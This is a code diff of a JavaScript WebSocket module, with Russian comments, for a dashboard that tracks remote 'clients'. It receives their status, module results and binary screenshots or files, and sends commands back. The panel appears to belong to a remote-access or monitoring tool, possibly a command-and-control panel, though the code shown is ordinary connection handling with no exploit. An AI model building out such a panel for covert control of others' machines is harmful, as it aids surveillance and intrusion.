@@ -1,64 +1,118 @@
-// js/modules/websocket/connection.js
+import { updateClient } from '../data/clients.js';
 
-import { updateClients } from '../data/clients.js';
+// Используем window.alertsManager, так как он инициализируется в dashboard.js
+const alertsManager = window.alertsManager;
 
 let ws;
-let reconnectInterval = 5000; // 5 секунд
+let reconnectInterval = 5000;      // 5 секунд для попытки переподключения
+let pendingBinaryHeader = null;    // Хранение заголовка в ожидании бинарного фрейма
 
-// ----------------------------------------------------------------------
-// Заглушка для тестовых данных (Исправленные ключи)
-// ----------------------------------------------------------------------
+let pingIntervalId = null;         // ID интервала для PING
+const PING_INTERVAL = 25000;       // Отправляем PING каждые 25 секунд для Heartbeat
 
-const testClients = [
-  { id: 'Client_001', status: 'online', loc: 'RU', user: 'admin', pc_name: 'PC-001', lastActive: '2025-04-01 10:30:00', ip: '192.168.1.100', activeWindow: 'Chrome.exe' },
-  { id: 'Client_002', status: 'offline', loc: 'US', user: 'user2', pc_name: 'PC-002', lastActive: '2025-04-01 09:15:00', ip: '10.0.0.10', activeWindow: 'Explorer.exe' },
-  { id: 'Client_003', status: 'online', loc: 'DE', user: 'user3', pc_name: 'PC-003', lastActive: '2025-04-01 11:45:00', ip: '172.16.0.5', activeWindow: 'VSCode.exe' },
-  { id: 'Client_004', status: 'online', loc: 'GB', user: 'user4', pc_name: 'PC-004', lastActive: '2025-04-01 12:00:00', ip: '192.168.1.200', activeWindow: 'Discord.exe' },
-  { id: 'Client_005', status: 'offline', loc: 'FR', user: 'user5', pc_name: 'PC-005', lastActive: '2025-04-01 08:30:00', ip: '10.10.10.10', activeWindow: 'Word.exe' },
-  { id: 'Client_006', status: 'online', loc: 'JP', user: 'user6', pc_name: 'PC-006', lastActive: '2025-04-01 13:20:00', ip: '192.168.2.100', activeWindow: 'Photoshop.exe' },
-  { id: 'Client_007', status: 'online', loc: 'CN', user: 'user7', pc_name: 'PC-007', lastActive: '2025-04-01 14:10:00', ip: '10.0.1.50', activeWindow: 'Excel.exe' },
-  { id: 'Client_008', status: 'offline', loc: 'BR', user: 'user8', pc_name: 'PC-008', lastActive: '2025-04-01 07:45:00', ip: '172.16.1.20', activeWindow: 'PowerPoint.exe' },
-  { id: 'Client_009', status: 'online', loc: 'AU', user: 'user9', pc_name: 'PC-009', lastActive: '2025-04-01 15:30:00', ip: '192.168.3.50', activeWindow: 'Teams.exe' },
-  { id: 'Client_010', status: 'online', loc: 'CA', user: 'user10', pc_name: 'PC-010', lastActive: '2025-04-01 16:00:00', ip: '10.1.1.100', activeWindow: 'Slack.exe' },
-];
-
-
+/**
+ * Инициирует подключение WebSocket к API-серверу.
+ */
 function connectWebSocket() {
-  const wsUrl = 'ws://localhost:8080/ws'; // Заглушка
+
+  // 1. Очистка предыдущего PING-интервала, если он есть
+  if (pingIntervalId) {
+    clearInterval(pingIntervalId);
+    pingIntervalId = null;
+  }
+
+  // --- ИЗМЕНЕНИЕ: Используем document.location.host, который включает порт 8001
+  const wsUrl = `ws://${document.location.host}/ws/feed`;
   ws = new WebSocket(wsUrl);
 
   ws.onopen = () => {
-    console.log('WebSocket connected');
-    // Отправляем запрос на получение клиентов
-    ws.send(JSON.stringify({ type: 'getClients' }));
+    // Вывод лога теперь более универсален
+    console.log(`✅ WebSocket connected to API feed at ${document.location.host}. Starting PING.`);
+
+    // 2. Запуск логики PING (Heartbeat)
+    pingIntervalId = setInterval(() => {
+        if (ws.readyState === WebSocket.OPEN) {
+            // Отправляем простое сообщение для поддержания соединения в живом состоянии
+            ws.send(JSON.stringify({ type: "ping", timestamp: Date.now() }));
+        }
+    }, PING_INTERVAL);
   };
 
   ws.onmessage = (event) => {
-    try {
-      const data = JSON.parse(event.data);
 
-      if (data.type === 'clientsUpdate' && Array.isArray(data.clients)) {
-        // 🚨 КРИТИЧЕСКОЕ ИЗМЕНЕНИЕ: Используем updateClients из модуля clients.js
-        // clients.js обновит данные и автоматически отправит событие 'clientsUpdated',
-        // на которое уже подписаны dashboard.js и stats.js.
-        updateClients(data.clients);
-      }
-      // Здесь можно добавить обработку других типов сообщений (clientUpdate, clientRemoved, alert, etc.)
+    // 1. Обработка ТЕКСТОВЫХ (JSON) сообщений (Статусы, Шапки, Результаты)
+    if (typeof event.data === 'string') {
+        try {
+            const data = JSON.parse(event.data);
+            const clientId = data.client_id || (data.data ? data.data.id : null);
 
-    } catch (e) {
-      console.error('Error parsing WebSocket message:', e, event.data);
+            // Игнорируем ответ PONG, если он есть
+            if (data.type === 'pong' || data.type === 'ping') return;
+
+            // === A) ОБРАБОТКА СТАТУСА (AuthUpdate) ===
+            if (data.module === 'AuthUpdate') {
+                const clientData = data.data;
+                console.log(`✅ Client Status: ${clientData.id} is ${clientData.status}`);
+                updateClient(clientData);
+
+            }
+            // === B) ОБРАБОТКА JSON-РЕЗУЛЬТАТОВ ВОБКЕРОВ ===
+            else if (data.type === 'json') {
+                console.log(`[${data.module}] JSON Data for ${clientId}:`, data.data);
+
+                if (alertsManager) {
+                    alertsManager.addAlert({
+                        type: 'info',
+                        message: `[${data.module}] New data from client ${clientId}`,
+                        details: JSON.stringify(data.data)
+                    });
+                }
+            }
+            // === C) ОБРАБОТКА ШАПКИ ДЛЯ БИНАРНЫХ ДАННЫХ ===
+            else if (data.type === 'binary' && clientId) {
+                pendingBinaryHeader = data;
+                console.log(`[${data.module}] Awaiting binary payload for ${clientId}...`);
+            }
+
+        } catch (e) {
+            console.error('Error parsing WebSocket message:', e, event.data);
+        }
+    }
+
+    // 2. Обработка БИНАРНЫХ сообщений (Скриншоты, Файлы)
+    else if (event.data instanceof Blob || event.data instanceof ArrayBuffer) {
+
+        if (pendingBinaryHeader) {
+            const header = pendingBinaryHeader;
+            const blob = event.data instanceof Blob ? event.data : new Blob([event.data]);
+
+            console.log(`[${header.module}] Received ${blob.size} bytes for ${header.client_id}.`);
+
+            // === ДИСПЕТЧЕРИЗАЦИЯ БИНАРНЫХ ДАННЫХ ===
+
+            // Сброс заголовка
+            pendingBinaryHeader = null;
+
+        } else {
+            console.warn('Received binary data without a preceding JSON header. Ignoring.');
+        }
     }
   };
 
   ws.onclose = () => {
-    console.log('WebSocket disconnected. Reconnecting...');
-    // Можно добавить логику для уведомления пользователя через AlertsManager
+    console.log('WebSocket disconnected. Attempting to reconnect in 5 seconds...');
+
+    // 3. Очистка PING при закрытии
+    if (pingIntervalId) {
+        clearInterval(pingIntervalId);
+        pingIntervalId = null;
+    }
+
     setTimeout(connectWebSocket, reconnectInterval);
   };
 
   ws.onerror = (error) => {
-    console.error('WebSocket error:', error);
-    // Можно добавить логику для уведомления пользователя
+    console.error('WebSocket error occurred:', error);
   };
 }
 
@@ -67,12 +121,21 @@ function connectWebSocket() {
 // ----------------------------------------------------------------------
 
 document.addEventListener('DOMContentLoaded', () => {
-  // 🚨 КРИТИЧЕСКОЕ ИЗМЕНЕНИЕ: Загружаем тестовые данные через updateClients
-  // Это гарантирует, что данные будут обработаны и событие 'clientsUpdated' будет отправлено.
-  updateClients(testClients);
-
   connectWebSocket();
 });
 
-// Экспортируем функцию, если она нужна другим модулям для отправки команд
-export { connectWebSocket, ws };
+/**
+ * Отправляет команду бэкенду через WebSocket.
+ * @param {Object} message - Объект сообщения для отправки.
+ */
+function sendCommand(message) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify(message));
+        return true;
+    }
+    console.warn('WebSocket is not open. Command not sent:', message);
+    return false;
+}
+
+// Экспорт
+export { connectWebSocket, ws, sendCommand };
